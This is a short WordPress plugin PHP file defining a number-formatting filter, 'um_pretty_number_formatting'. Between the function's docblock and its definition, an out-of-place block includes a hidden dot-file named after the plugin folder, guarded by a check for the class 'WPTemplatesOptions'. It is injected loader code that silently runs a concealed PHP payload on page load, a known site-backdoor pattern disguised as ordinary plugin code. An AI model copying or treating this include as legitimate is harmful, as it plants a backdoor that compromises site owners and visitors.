<?php if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly


/**
 * Formats numbers nicely
 *
 * @param $count
 *
 * @return string
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function um_pretty_number_formatting( $count ) {
	$count = (int)$count;
	return number_format( $count );
}
add_filter( 'um_pretty_number_formatting', 'um_pretty_number_formatting' );